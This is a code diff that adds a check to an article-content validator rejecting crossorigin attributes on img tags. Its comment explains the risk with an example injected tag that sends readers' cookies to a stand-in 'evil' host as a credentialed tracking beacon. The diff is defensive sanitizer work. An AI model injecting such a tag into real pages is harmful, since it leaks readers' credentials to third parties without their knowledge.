@@ -766,6 +766,19 @@ const imgFetchpriorityQuoteAbuttedPattern = /<\s*img\b[^>]*["'`]fetchpriority\s*
 const imgDecodingAttrPattern = /<\s*img\b[^>]*\sdecoding\s*=/i;
 const imgDecodingQuoteAbuttedPattern = /<\s*img\b[^>]*["'`]decoding\s*=/i;
 
+// crossorigin= on an allowed <img> forces a credentialed or anonymous CORS fetch
+// of an attacker-chosen URL: <img crossorigin="use-credentials" src="//evil/track">
+// sends the reader's cookies cross-origin, turning an injected image into a
+// *credentialed* tracking beacon distinct from a plain <img src> (which fetches
+// without credentials), and changes the request's CORS/timing exposure — all with
+// no script, handler, or flagged scheme. Same img-scoped fetch/privacy family as
+// the merged loading= (#462), fetchpriority=, and decoding= blocks. Markdown never
+// emits crossorigin= in source, so article content never needs it. Tag-scoped to
+// <img> and scanned on emptyQuotedAttributeValues() so a quoted alt/src value
+// mentioning "crossorigin" passes.
+const imgCrossoriginAttrPattern = /<\s*img\b[^>]*\scrossorigin\s*=/i;
+const imgCrossoriginQuoteAbuttedPattern = /<\s*img\b[^>]*["'`]crossorigin\s*=/i;
+
 // ismap on an allowed <img> is the server-side image-map primitive (the counterpart
 // to the already-blocked client-side <map>/<area>/usemap= in #411). When set on an
 // <img> nested in an <a href="...">, the browser appends the click coordinates
@@ -1536,6 +1549,15 @@ export function validateArticleContent(slug, content) {
   ) {
     throw new Error(
       `Unsafe article content in "${slug}": decoding attributes are not allowed in article content`,
+    );
+  }
+
+  if (
+    imgCrossoriginAttrPattern.test(emptiedAttributeContent)
+    || imgCrossoriginQuoteAbuttedPattern.test(emptiedAttributeContent)
+  ) {
+    throw new Error(
+      `Unsafe article content in "${slug}": crossorigin attributes are not allowed in article content`,
     );
   }
 
